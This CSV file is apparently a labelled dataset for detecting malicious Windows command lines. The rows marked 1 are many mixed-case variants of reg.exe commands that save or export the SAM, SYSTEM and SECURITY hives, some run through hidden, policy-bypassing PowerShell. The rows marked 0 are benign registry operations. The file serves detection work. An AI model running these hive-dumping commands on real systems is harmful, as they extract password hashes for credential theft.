text,label
PoWErSHELL -CoMMANd reG.eXe EXpORt  hkeY_LOCAl_mAChInE\sEcuRITy   \.\c$ACkup.rEg,1
"reg.exe restore ""hkcu\software\myapp\settings\subkey28"" ""hkcu\control panel\desktop_731""",0
PowERShelL -ExEC BYPAss -w HIDDEn -C rEg.exe   eXpOrt  HkEY_LOcal_MaCHINE\SaM c:\WINDows\temP\Sam.saVe   /y,1
"Cmd /c pOWershELl -C ""REG.eXE  sAve hKeY_loCaL_mAchinE\SYSTem \\locaLhOSt\C$\__duMp\Sam.BaK""",1
"powershell -c reg restore ""hkcu\control panel\desktop"" ""hkcu\software\google\chrome_588""",0
Reg.exe sAvE   HKey_loCAl_MaChInE\SYStEm \.\C$aCKUP.Reg /Y,1
POWERSHELL -ExeC bYpAss -W HIDden -C rEG   sAvE hkey_LOcaL_MAChine\secuRiTY   c:\wiNdOws\TEmP\sam.save,1
poWErShELl -eXeC BYpaSs -w HIDDEN -C rEg.EXe   Save   Hklm\SysTEM   C:\Temp\SYStem.HIve,1
"PoWersheLl -c ReG Copy ""hKcu\SoftwaRe\mYAPP\SEttINGS\sUbKey94"" ""HKcu\ENVIRoNmEnt_191""",0
PoWERsHeLL -exEC bYPaSS -W HIdden -c Reg  SAVe hKeY_LOCAl_MachiNe\SEcuRity C:\useRs\PUBlIC\regISTry_ExPoRT.Reg  /y,1
C:\WInDOWs\systEm32\cMD.exe /K reg.eXe   sAVe  Hkey_LoCAL_MAChIne\SyStem   c:\UserS\PuBlic\rEgIStrY_ExpORT.reG   /Y,1
"powershell -c reg.exe  copy  ""hku\software\policies\mycorp\subkey81""  ""hku\software\google\chrome_986""",0
poWERSHElL -COMmAnD reg.eXE  sAvE   HKlm\syStEm   \\localHoSt\C$\__DUMp\SAm.bAk,1
"powershell -c reg add ""hku\control panel\desktop\subkey53""  /t reg_sz",0
powERSHELl -exeC byPAsS -w hIDDeN -C rEg EXport  hkeY_LoCal_MAcHine\saM  \\LoCALhosT\c$\__dUmP\sAm.bAK,1
reG   EXPORT HkeY_LOCal_MaChINe\sysTeM   \.\c$aCkuP.rEg  /y,1
"Cmd /C POWerShelL -C ""Reg   exPORt  HKEy_LOCAL_MaCHINE\sYstem   c:\UserS\pUBLIC\rEGISTrY_ExpORt.reg  /y""",1
"CMd /C ReG.Exe  COmPAre  ""HKEY_cUrrENT_usEr\soFTwaRE\cLAsSES\sUbKey42""  ""hkEY_CURrENt_usEr\sOFtWaRE\poliCieS\MycOrp_686""",0
powershell -command reg.exe save hklm\security  c:\users\public\registry_export.reg  /y,1
"rEg CoPy ""hKcU\soFtwARe\mYapP\sETtINGs\suBKey60"" ""Hkcu\CONtROl paneL\DesKTOP_160""",0
POwersHeLl -ExEC ByPaSS -w hIDDeN -C ReG.ExE   EXPORT  HkLm\sYSTEm c:\WINDoWS\TEmp\sAM.sAve,1
"reg.exe query ""hkcu\hkey_local_machine\software\policies\microsoft\subkey26"" /v version",0
"Reg copy ""hkey_loCaL_mAcHiNE\eNvirONMent\sUBkeY68"" ""HkEY_LOCAl_MAChINe\EnviRONMeNt_963""",0
powerSHeLl -CoMMAND reG.exe  saVE hkLm\SYsTEM  \.\C$ackUP.ReG,1
"REG.exe   COpY   ""HKCu\contROL PAnel\DESKtoP""   ""Hkcu\soFTWARe\GOOGLE\chRome_274""",0
powErshEll -ComMaNd rEg.ExE  savE  HkLm\seCUrity \.\C$aCKUp.Reg,1
"reG   copy   ""hKEy_LOCAl_mACHINe\soFTwArE\mICRosoft\wiNDOws\CurrenTVeRSion\SubkeY58""   ""HKey_lOcAL_maCHINe\SoFTWare\GooGle\cHromE_285""",0
powERsHEll -exEC byPAss -W HIdDeN -C reG   expOrt hKeY_locaL_macHine\SYSTeM  \\lOcALhOsT\c$\__DUmP\SAM.bAK,1
"cmd /c powershell -c ""reg  export   hkey_local_machine\sam   \.\c$ackup.reg  /y""",1
"ReG.EXE  cOmPare  ""HKEY_CuRrENt_uSER\HKEy_loCAL_mAcHInE\SYSTEm\CUrRENTcONtROlSeT\ConTrOl""  ""hkeY_cUrreNt_User\hKeY_loCal_mAchiNE\sofTwarE\PoliCies\MiCrOSOFT_272""",0
c:\wINDowS\SystEM32\CMD.ExE /K reg.eXE   Save  hKLm\SySTem  \\LOCaLHosT\c$\__DUmp\SAm.BAK   /Y,1
"reg.ExE  RESTOrE  ""hKey_cUrrent_uSER\SOfTWaRE\ClasSeS""  ""hkEy_CuRRent_usEr\softWaRE\MYapp\setTings_824""",0
"ReG Delete ""hku\HkeY_lOCAl_mAcHine\SoFtwARE\wOw6432nODe"" /v LaStUPdAte",0
"ReG.exE  unLOaD  ""HKEY_LoCaL_maChiNe\SyStEm\CuRRentCONTrOlSEt\SErviceS""  /V PATH",0
"pOWerShElL -c rEG   adD   ""hkU\soFTWare\poLICIeS\MycOrp\sUbKEY18""   /F   /T reg_DWorD   /D ""C:\pRogram fiLeS\aPP""",0
"reg.exe   add   ""hku\environment""   /v version   /t reg_sz   /d 1",0
"cmd /c reg add ""hkey_users\system\currentcontrolset\services\subkey55""  /t reg_dword /d ""c:\program files\app""",0
"cMD /C POWERsHeLL -C ""rEG  ExPoRt   hkEy_locAL_MAChiNe\SAm   c:\UsErS\pubLic\reGistry_ExpOrt.rEg""",1
"cmD /c PowERshEll -c ""rEG ExpOrT HkEy_LOCAl_mAChinE\SAm c:\winDOws\temP\sam.saVE /y""",1
pwsh -noprofile -c reg.exe  save hkey_local_machine\system  c:\users\public\registry_export.reg,1
"ReG   COmpArE   ""hkeY_uSers\ContROL PaNeL\DESKtoP\subKey40""   ""hKeY_uSErs\sOfTWArE\ClAsSES_621""",0
"Reg  unLOAD  ""HKCU\HkEy_lOCAL_mAChIne\SOftWaRE\woW6432NoDe""",0
"CMD /C reG  reSTorE  ""HKeY_users\sOFtWaRE\micROSOFt\wINDOws\cuRReNtvErsIoN""  ""hkEy_UseRS\SYstEm\CURRentCoNtROlset\SeRvICES_547""",0
"reg   compare   ""hkey_users\hkey_local_machine\software\wow6432node\subkey61""   ""hkey_users\hkey_local_machine\software\policies\microsoft_918""",0
"rEg.Exe coMPAre ""HkEY_CuRrENT_USeR\SOFtware\GOOGLe\CHRomE\sUbkEY59"" ""HKEY_cURRenT_UsER\ENVirOnMenT_249""",0
"Reg.EXE   Copy   ""hku\cONTRol paNEl\desKToP""   ""HkU\Hkey_LocAl_MAchINe\sofTwaRE\pOliCIeS\micROSoFt_582""",0
"cmd /c powershell -c ""reg save  hklm\sam \.\c$ackup.reg /y""",1
"powershell -c reg   query   ""hkey_users\software\classes""   /v version",0
powershell -command reg.exe   export hklm\security  \.\c$ackup.reg   /y,1
"rEG.eXe  restoRE  ""hkey_currenT_USEr\HKEy_LoCal_maCHInE\SysTem\CuRrEntCOntrOlsET\CONtRoL""  ""hkey_CUrrENt_usER\coNTRoL pANeL\DESkTop_209""",0
"reg  restore  ""hku\software\myapp\settings""  ""hku\software\myapp\settings_486""",0
"CmD /c PoWeRSHeLl -c ""ReG.Exe exPORT   hKey_lOcAL_MaCHiNe\systEm   \\LOCAlhOsT\c$\__Dump\sAM.bAk /y""",1
"ReG.Exe  saVe  ""hkeY_cURRent_USEr\ContROl paneL\DESKtOp""  ""c:\UsERs\pUbliC\cHRome_dATa.bAK""",0
reg   save hkey_local_machine\system c:\windows\temp\sam.save /y,1
"reg copy ""hkey_users\software\google\chrome\subkey57"" ""hkey_users\system\currentcontrolset\services_772""",0
pwSH -noproFILe -C reG.exE   exPort  hkeY_LOCaL_maChinE\sAm   C:\WinDOws\TEmP\saM.saVe  /Y,1
"StARt /B rEg   UnLOad   ""HKey_useRs\SOFtwarE\GOoGLe\chroME\suBkEY4""   /F",0
"reg compare ""hkcu\software\policies\mycorp\subkey39"" ""hkcu\hkey_local_machine\system\currentcontrolset\control_926""",0
pWSh -NOProFIlE -c rEg.eXE   EXpOrt   HkLm\SYSteM \\LOCalhosT\C$\__dumP\saM.Bak   /y,1
POWeRsHeLl -Command Reg Export  hkLM\saM  \.\C$AckuP.ReG   /y,1
cmD.eXe /c starT /B REG EXport hkEY_LocAL_MAChINE\SecURiTy   c:\tEmP\SySTEM.HiVE /Y,1
"rEG ADd ""HKu\hkeY_LOcaL_mAcHINe\sYsTEM\cuRRENtcoNTrOLset\controL"" /V PAth /T rEg_dwORD /d ""1.0.0""",0
"REg.EXe  copy  ""HKu\hKeY_locaL_mAcHiNe\sOFTwaRE\pOLiciES\MiCrosofT""  ""HKu\hKEY_LOcal_MaChinE\sOftwARE\woW6432nodE_475""",0
"reg.EXe  rEStoRe  ""hkcU\eNvIroNMenT\suBKey17""  ""hKCu\SOftWare\GOOgLE\chROmE_278""",0
"cMd /c pOwErSHEll -c ""rEG   ExporT HKey_LOcaL_mACHInE\sECUrIty \.\c$ackup.rEG""",1
pOwErSheLl -CoMMANd Reg  save hkLM\sEcurIty   C:\USERs\PuBLIc\regISTry_EXPOrt.REg,1
"Reg.Exe  ReSTOrE  ""Hkey_users\ENviRONment\suBkEy37""  ""hkey_Users\EnvironmENt_247""",0
"POwErSHeLl -c rEg query ""HkU\hkEY_lOcAL_mAchiNe\SOFtware\wOw6432NOdE\sUBKeY52"" /V laSTUPdaTE",0
"Reg.Exe  quErY  ""HKey_CUrREnT_UseR\soFTwaRE\POLIciEs\MYCOrp""",0
"POwERSHElL -C Reg.exe   resTOrE   ""HKEy_cURREnt_uSER\SofTware\cLassEs\subKey31""   ""hKEY_curREnT_user\SoFTware\mYApP\seTTINgs_748""",0
"Reg.Exe  coMpARe  ""Hkey_USErS\SoFtWArE\MYaPp\SEtTings""  ""hkeY_Users\softWAre\PolicIES\mYCoRp_477""",0
C:\wINDOwS\systEm32\cMd.eXE /K Reg.EXE ExpORT hkeY_lOcal_MAChInE\sYSTEm   \\locAlhoST\C$\__dUMp\sam.bAk,1
PoWeRSHelL -comMand rEG.exe Save hkeY_lOCAl_MAcHiNe\SaM   c:\WiNdOwS\TEmp\SAm.SaVE  /y,1
"sTarT /B ReG  Copy  ""hKEY_LOcal_mAcHinE\hkey_LOCAL_maCHinE\sYstEm\cURrEntCONtRolSET\contRoL""  ""HkEy_loCAL_MACHINe\soFTWAre\MicroSOft\wINdOws\CuRReNtVERSiOn_592""",0
c:\wInDoWS\SysTEM32\CmD.Exe /k rEG   Export hKEY_lOCal_machInE\saM  C:\temP\SYSteM.hive,1
poWerShELl -coMMANd Reg   SavE   hklM\sYSTEM C:\usErS\puBliC\regiSTrY_EXPoRT.rEG,1
cMd.exe /c ReG eXporT   hkEy_loCAL_MacHine\sAM   %TeMP%\SeC_BACkup.daT  /Y,1
"reG  sAvE  ""Hkey_lOcAl_MachInE\hkeY_locAL_maChINE\SoFtwAre\PolicIes\mICrOsOft""  ""C:\TEMP\USEr_settIngs.rEG""",0
"cMd /c rEg.EXE   REstore   ""HKeY_UserS\COnTROL panEL\DeSKtop\sUbkeY84""   ""hkey_uSERS\soFTwarE\MYApP\sETTinGs_702""",0
"reg.exe save ""hku\system\currentcontrolset\services"" ""c:\windows\temp\software_dump.dat"" /y",0
"Reg qUerY ""Hkey_cURRENt_UseR\COnTrol pAnEl\DesKtop"" /v veRsiOn",0
CmD.ExE /c Reg.eXE expORT HkLM\sam  c:\USErs\PuBlIC\REGIsTRY_EXpORt.reg   /Y,1
"REG.Exe  DeletE  ""hkEY_cURrENt_USER\SySteM\cUrreNTcOntROlsET\Services""",0
poweRShEll -EXec BypaSs -w hIDDEn -C reG sAvE   hKEy_LoCAl_macHINe\SysTEm   c:\useRS\PuBlIc\ReGIStrY_ExPorT.rEg,1
"Start /b REg.eXe   DelETE   ""hkEy_uSeRs\HKey_LOcAl_maCHIne\SofTwArE\poLICies\MICrosOfT""   /V VERSioN",0
cmd.exe /C reg.EXE  EXPoRT   HKlm\System  c:\WinDOWs\TEmP\SAM.savE,1
powershell -command reg save   hklm\sam  c:\users\public\registry_export.reg,1
"start /b reg   compare   ""hku\software\myapp\settings""   ""hku\software\myapp\settings_665""",0
"start /b reg  delete  ""hkey_current_user\software\classes\subkey71""  /f",0
"REG.EXe dELEte ""hkEy_useRs\CONtROl PAnEL\dEsKTOP\SubkeY81"" /v PaTH",0
reg.exe export   hklm\system   \\localhost\c$\__dump\sam.bak,1
"CMD /c REG   savE   ""hkEy_LoCal_MAcHiNE\hkey_LocaL_maCHINE\SOFTwaRE\pOLIcieS\miCROSOFT\subkey2""   ""c:\teMP\useR_SEtTINGs.ReG""   /y",0
"Reg CoMpARe ""hkCU\sofTWARE\clASSEs\SUBkey57"" ""HkCU\cONTroL panEL\desktOp_248""",0
POwErshell -cOMmand rEg   SAve hkeY_lOcaL_mACHINe\SecurITy   \.\c$AcKUp.REg,1
"ReG cOmParE ""hKEy_CuRrent_USeR\eNVIRONmENT\SuBKEy74"" ""HKEy_CuRRent_USeR\SofTWArE\GooGLe\chrOME_596""",0
"cmd /c powershell -c ""reg save hkey_local_machine\sam  \\localhost\c$\__dump\sam.bak""",1
"REG.ExE deleTe ""HkU\hKEy_lOCal_MAcHINe\sOftWaRE\polICIEs\MICRoSOFT"" /f",0
"cmd /c powershell -c ""reg.exe  export hkey_local_machine\security \\localhost\c$\__dump\sam.bak""",1
C:\wInDoWS\sYsteM32\cMD.EXe /k REG.EXe   eXpoRT hkeY_LoCAl_MacHiNe\sYStEm C:\uSERs\pubLic\regIStRY_ExPorT.reg   /Y,1
"POwErsHell -c REg.eXE Copy ""HKEY_cuRREnT_uSeR\sOFTWaRE\goOGLe\chrome\sUbKeY100"" ""hKey_cuRREnT_User\envIRonMeNt_752""",0
"REG   Add   ""hKEY_CurRent_UsEr\HkeY_loCAL_maCHINE\soFTwAre\pOLIciES\mIcrOsoft""   /V PAth   /t reg_DwOrD   /d ""1.0.0""",0
"ReG.EXe add ""hkeY_USErs\SOftWaRe\MicrOsofT\WiNdOWS\CurREnTVersIon""  /t reG_Sz /d ""c:\prOgRAM FILeS\ApP""",0
"pOWErsHeLl -C REG.eXe  adD  ""HKEY_LOCAl_MacHINe\SOFTwaRE\MIcrOSofT\WINdowS\curRenTVERsiON""  /v lAstupDAte    /d 1",0
"start /b reg.exe unload ""hkey_users\environment""",0
pWSH -NOpROfile -C Reg eXPoRT   hKEY_lOCaL_mACHiNe\sySteM  C:\usERS\PubLIc\regiSTry_expORT.Reg /Y,1
"cmd /C pOwErshELL -C ""REG expoRT   hKEY_LocAL_MachinE\SeCuRIty  \.\c$ACKup.ReG  /Y""",1
pwsH -nOpRofILE -c REg.EXe eXPorT hKEy_local_mAcHIne\sAM  C:\temP\sYSTEm.HIVe  /y,1
powErshElL -Exec BYPASS -w HiDden -c Reg  savE  hKEY_LocAL_MAchIne\SyStEm   c:\TEmP\sYstEm.HIVe,1
"cmd /c rEG   aDd   ""HKEy_usErS\sOFTWarE\gOogLe\cHROME""   /V VErsion      /d ""1.0.0""",0
"PoWERshEll -c ReG.Exe SAVe ""HKeY_locAl_MachINe\hKey_loCaL_maChiNe\SofTWARe\PoliCIeS\MiCrOSofT\sUbkEY50"" ""C:\WiNdOws\tEMp\sOftwARE_DuMP.dAT""",0
"reg.exe restore ""hkey_users\software\classes"" ""hkey_users\environment_139""",0
"Cmd /C rEG  SAVe  ""hkey_cURReNT_useR\SysteM\CurrenTCOnTroLSet\sERViCEs""  ""C:\WinDowS\tEMp\SOFtWArE_DUmp.dat""",0
"reg SavE ""HKEY_cURrENt_USeR\HkEy_loCaL_MACHine\SYstEM\cuRrENTControLset\CoNTrOL\suBkey93"" ""c:\WINdOWs\TEmP\SoftWARe_duMp.DAt""",0
C:\wIndowS\SysteM32\cMD.exe /k REG.exe   ExpORt  HkLM\SysTeM   \.\C$acKuP.reg /y,1
"rEg.ExE qUerY ""hkU\SOFTwaRe\MYAPp\seTTiNGS\sUBkeY94"" /F",0
c:\windows\system32\cmd.exe /k reg  save   hklm\system   c:\windows\temp\sam.save,1
"Reg.eXe  dElETE  ""hkEY_UsERs\sOFtWARE\gOOgle\CHromE\SUbkeY59""",0
"reg  save  ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control""  ""c:\users\public\chrome_data.bak""  /y",0
"reg   compare   ""hku\environment\subkey2""   ""hku\software\myapp\settings_609""",0
pwsh -noprofile -c reg   save hklm\system  \.\c$ackup.reg /y,1
"rEg  coPy  ""hKCu\Hkey_locAl_MaChINe\SYSTEm\CurreNTCONtROLSeT\conTROL\subkEY87""  ""hkCU\SOfTWarE\clAsSes_416""",0
"ReG ADD ""HKu\sOFtwarE\PoliciES\MycORp"" /V PAth  /d 1",0
"sTaRT /b rEg  DElEte  ""HkcU\ENvIRONmEnt""  /V PatH",0
cmd.exe /c reg export  hklm\sam \.\c$ackup.reg,1
C:\wInDowS\SYstem32\CMd.EXE /K ReG.ExE SavE   Hklm\sECuriTy  \.\C$aCKup.ReG,1
CmD.eXE /C STart /b ReG.Exe   exPorT  HkEY_loCal_MachiNE\SysTem  %TeMP%\SeC_bAckup.dat   /y,1
"reg   add   ""hkcu\software\classes\subkey63""   /v lastupdate   /t reg_sz   /d 1",0
"cMD /C rEG resTorE ""hKey_LoCaL_MAChIne\sOftWARE\GOOGle\CHROmE\suBKey53"" ""Hkey_LocaL_machinE\HkEY_LOcal_maChiNE\sYsTeM\CUrRentContRoLSet\cONtrOL_841""",0
"cMd /C PoWERsHELL -C ""reg.exE  SaVE HKEY_LOcal_mAchINe\sAm   c:\WInDoWs\TeMp\SAm.SavE /Y""",1
"REG   DELeTE   ""HKey_uSers\sofTwArE\MiCROSOFT\WindOws\CurrENTVERsiON""   /V VeRsIoN",0
"CMD /C reg sAvE ""hKEy_local_MACHinE\soFTWaRe\GooGLe\CHROme"" ""C:\temp\UseR_seTTiNgS.ReG"" /Y",0
"POweRsHell -C rEg sAvE ""hkEY_lOCal_mAchINe\hkEY_lOCAl_MAchINe\soFtware\POLICiEs\MIcroSOFT"" ""D:\bacKUP\rEgiStRY_hIve.DaT""",0
"reg.eXe   COpY   ""HKeY_LoCaL_MacHInE\SoFTWARE\MiCrosoft\wINDoWs\cUrrEntversION""   ""HKey_LOCAL_maCHIne\HkeY_lOCaL_mAchine\sOfTwaRe\Wow6432nOde_643""",0
powershell -exec bypass -w hidden -c reg   export hklm\system  \\localhost\c$\__dump\sam.bak,1
CmD.EXE /c reg save  hklM\sECURitY  \.\c$AckUp.Reg,1
CMd.EXE /c reG.ExE   ExpORt  hKEY_loCal_MacHINE\sECUritY  c:\WiNDows\teMP\SAM.saVe  /Y,1
powershell -exec bypass -w hidden -c reg   export  hkey_local_machine\system   c:\temp\system.hive  /y,1
powershell -exec bypass -w hidden -c reg  save  hkey_local_machine\security   \\localhost\c$\__dump\sam.bak   /y,1
"cMD /c reG   ReSTorE   ""HKEY_USers\HKeY_LoCAL_mAcHInE\SOFTwaRE\woW6432node\subKEY37""   ""HkEY_uSERS\COnTrOL panEL\dESkTOp_934""",0
"ReG.EXE   cOPY   ""hKeY_cUrrENT_uSER\HkEy_LoCAL_MacHInE\syStEM\currENTcOntROlsET\coNtroL""   ""HkeY_cURREnt_UsEr\SOFtWaRE\poLicies\MYCorP_678""",0
c:\WIndOWs\SYsTeM32\CmD.EXE /k ReG.eXe   sAvE   HKLm\sAm   c:\uSERS\pubLic\reGIStRY_exPOrT.reg   /y,1
"powershell -c reg.exe  compare  ""hkcu\system\currentcontrolset\services\subkey69""  ""hkcu\hkey_local_machine\system\currentcontrolset\control_419""",0
cMD.eXe /C sTart /b reg.EXe   SAvE   HKeY_loCal_mAcHine\seCurITY   %TEMP%\sec_bACKUP.dAT,1
"reg.exe  add  ""hkey_users\software\google\chrome\subkey25""  /f  /t reg_dword",0
"reg  delete  ""hkey_current_user\software\myapp\settings""  /v version",0
pwsh -NoProFILe -c rEG  saVE  hKLM\SYStem  \.\c$ACkup.REG /Y,1
C:\wInDOws\syStEM32\CMd.ExE /k REg.Exe   ExPORt hkEy_LOcAl_MAcHiNE\sAM  %Temp%\Sec_bacKUp.Dat,1
"reg.exE  quErY  ""hkey_CUrreNt_uSeR\HkEy_LOcaL_mAchIne\SysteM\CURRENTcONtrOlSeT\COntRoL""  /f",0
"cMd /c PoweRSheLL -C ""REg ExPoRT  HkLm\secUrity   \.\c$AckUP.rEg /Y""",1
"poWersHElL -C REg.ExE  queRY  ""hkU\sOFTWarE\MyaPP\SettinGS\SubKeY9""",0
"REg ReSTORe ""hKU\cONtrol paNEl\desKTOP\SubkeY63"" ""HKU\envIrONMEnt_732""",0
"staRT /B REG.eXE   reStOrE   ""hKu\SysteM\cUrREntCONTrOLSet\serViCES\SUBKeY56""   ""hKu\HkEy_locaL_MAcHInE\SyStem\CurrenTcontRolset\ContRoL_803""",0
"reg  compare  ""hkey_users\software\google\chrome""  ""hkey_users\hkey_local_machine\software\wow6432node_756""",0
"reg  delete  ""hkey_current_user\control panel\desktop""  /f",0
c:\wiNdoWS\sYstem32\cmD.Exe /k Reg.exE  Save   hKLm\sySTEm   %tEMp%\sEC_BACKUp.daT,1
reg   export  hkey_local_machine\security  c:\users\public\registry_export.reg,1
"cmd /c powershell -c ""reg   export   hkey_local_machine\system \.\c$ackup.reg""",1
"start /b reg.exe  restore  ""hkey_local_machine\system\currentcontrolset\services\subkey3""  ""hkey_local_machine\software\classes_993""",0
poWersHElL -cOmManD reg SAve   HkeY_loCal_MaCHINE\SecurItY   c:\usErS\PuBlIC\rEgIStrY_ExPOrT.REG,1
"reg  save  ""hkey_local_machine\hkey_local_machine\software\wow6432node""  ""c:\users\public\chrome_data.bak""",0
"rEG savE ""hkU\eNVIRONmENT"" ""c:\temp\USeR_setTINGs.rEG""",0
pwsh -NOprOfILE -C REG.ExE   sAVE  HKey_LOcal_mAchine\Sam c:\WinDows\TEmp\saM.SaVe  /Y,1
PWsh -nOPrOfILe -C reg saVe  HkLm\saM   c:\UseRS\puBlIc\REGISTrY_EXpoRT.REg,1
PoweRSheLL -COMMAnD rEg.EXe SAVe   hkeY_loCAL_maChINE\SAM  c:\wIndOws\TeMp\saM.Save,1
REg   save   hKLM\SAM  c:\uSerS\PUBLiC\ReGiSTry_exPOrT.rEG /Y,1
"rEG   rESTOre   ""hkEy_USErs\SOFtWarE\gOoGlE\cHroMe\sUBkey27""   ""HKEy_UseRS\SoFTWARe\CLaSSes_390""",0
"REG.eXE   COMpaRe   ""HKey_LOcal_machINE\HKEY_loCal_MAchine\soFtware\PoliCiEs\MIcRosOFT""   ""hkey_LOcAL_MacHINE\syStem\CUrreNtcONtrOlseT\sERVIcEs_884""",0
"cmd /C rEg   UNLoad   ""HkEy_LOCaL_maCHINe\sOFTwAre\clAsseS""   /v lastUPdAtE",0
CMd.ExE /C REg EXPOrt HkeY_locAl_mACHiNE\sAm \.\C$aCKup.REG  /y,1
pOWershELL -eXec byPASS -W HIddeN -c REg.exE SaVE hKeY_LoCAL_MAcHiNe\securIty   %temP%\sec_baCKuP.dAT,1
cMd.Exe /C StART /b REG  SAVE   hklM\saM   \\LOCALhosT\c$\__DUmp\SAM.Bak,1
powershell -exec bypass -w hidden -c reg export hkey_local_machine\security   \.\c$ackup.reg,1
Reg.eXe  Save hKeY_LocAl_MAcHInE\SaM   C:\TEMP\SysTeM.hIVE   /Y,1
"REG.exE   cOMpArE   ""hKCu\soFTWaRe\CLaSSes""   ""hKcu\SOfTware\GOOGle\CHRoMe_203""",0
"rEG.EXe   CopY   ""hKEy_LocAl_mACHiNE\SoFtwaRe\Policies\MYCORP\sUbkey88""   ""Hkey_LOcAL_MACHInE\sOfTWArE\googLe\CHRome_634""",0
"cmd /c reg  add  ""hkey_users\software\classes""    /t reg_dword  /d 1",0
"CMd /C POwersHELL -c ""rEg   Export hKEY_LOCAL_mACHiNe\SysteM  \.\C$ACkup.reG""",1
"CMd /C poWErShElL -C ""rEG.eXe   SAvE Hkey_lOcaL_MAcHiNe\sysTeM   c:\uSERS\PUblIC\REgIStRy_eXpOrT.reG  /Y""",1
"powershell -c reg restore ""hkey_current_user\software\classes"" ""hkey_current_user\environment_877""",0
pwsh -NOPRoFilE -c reg.eXE   saVe  hKLM\sAm %tEMp%\Sec_bacKup.dAt,1
c:\WINDOWS\sYsTEM32\CMD.ExE /K rEg   SAVe  hkEy_LoCal_maCHINe\sam   \.\c$acKup.REG /y,1
"cmd /c powershell -c ""reg.exe   save  hkey_local_machine\system c:\users\public\registry_export.reg  /y""",1
"reg.exe unload ""hkey_current_user\environment"" /v path",0
"CMD /C PoweRShEll -c ""REG.ExE   savE  HKEY_lOCaL_maCHinE\sAM   c:\wInDows\TemP\saM.SAve""",1
pwsh -noprofile -c reg.exe save  hkey_local_machine\sam c:\windows\temp\sam.save /y,1
"reG  comPARe  ""hKU\sOFtwaRE\GOogle\ChroME""  ""hKU\cONTRoL PaneL\DesKtOp_499""",0
cMD.Exe /c REG   eXporT  HKEy_LoCAl_MachINE\Sam \.\c$acKUp.ReG /y,1
ReG.eXe  eXPort  hkey_LocaL_MaChiNe\SaM c:\Temp\SysteM.HiVE /y,1
"CmD /C reg.EXE AdD ""HkeY_LOCAL_MacHInE\SoFTWArE\Myapp\SEttiNGs"" /v versIoN /T rEG_DWoRd /D 1",0
CMd.eXE /C ReG  ExpoRT   hKLm\sAM  C:\Temp\sYstEm.hIVE,1
POWershELl -eXEC BYPASS -W HiDDEn -c reg.eXE saVe hKLm\sYstem   C:\USeRs\pUbliC\reGiSTRY_EXpoRT.REg,1
"cMD /C rEG.eXe  qUeRy  ""hKEY_UsERS\Hkey_locAL_mAchInE\SofTWaRE\pOlICIEs\mIcrOSoft""  /F",0
powershell -exec bypass -w hidden -c reg   save  hklm\sam   c:\users\public\registry_export.reg,1
pwSH -NOpROFilE -C ReG.ExE  sAve hKeY_loCaL_MAchiNe\SyStem %TEMP%\seC_BACKup.dat,1
"pOWerSHELl -c ReG  ADd  ""hKCU\Hkey_LoCAL_mAChiNE\sofTWAre\POlicIeS\MICRosOft\sUbkeY82""  /V vERsiON    /D ""1.0.0""",0
"reG.EXE  QUErY  ""HKcu\SOFtwaRE\clAssES\suBkEy30""  /F",0
POwERsHEll -COmMand REG.eXE   EXpoRt   HKLm\SyStEM  \.\C$aCkUP.REg,1
"pOweRsHelL -c ReG.ExE   AdD   ""HkeY_LOcaL_mAcHinE\COnTRol PaneL\DESKTop""   /V LaSTuPDATE   /T REG_dWoRd   /d ""c:\ProGram FIlES\APp""",0
powershell -command reg save  hkey_local_machine\system   \\localhost\c$\__dump\sam.bak,1
Cmd.Exe /c stArt /b reG.exe  eXpoRT Hkey_LocaL_MAChINe\SecuRitY   \\LOcalHoSt\c$\__duMP\SAM.BAk  /Y,1
"reg.exe save ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control\subkey91"" ""c:\users\public\chrome_data.bak""",0
CMd.exE /C StaRt /b REG   sAVe hkeY_lOcaL_macHinE\SECurIty  C:\UsERS\PUbLIc\rEgistRY_eXport.reg   /Y,1
reG.eXe EXPOrT hKEY_LocAL_machiNe\SAm C:\uSERs\PUBlIC\rEGiSTry_EXPORT.ReG,1
"REG cOPY ""HKEY_USers\SofTWarE\ClaSSes\suBKeY20"" ""hKey_useRS\HKeY_lOcAl_MaChinE\SOfTWaRE\WoW6432NOde_672""",0
powershell -exec bypass -w hidden -c reg  save   hklm\system  c:\windows\temp\sam.save,1
powershell -exec bypass -w hidden -c reg.exe  save hklm\sam %temp%\sec_backup.dat   /y,1
"Reg.exE  deLeTe  ""hKeY_loCal_mAcHINe\hKey_LOcal_mACHine\sYSTEm\CUrreNtCONtROLsET\COnTrol\Subkey81""  /v veRSIon",0
"reG.exE deLetE ""hkCu\sOftWarE\MyapP\seTtINGS\SUbkEY19"" /V VErsioN",0
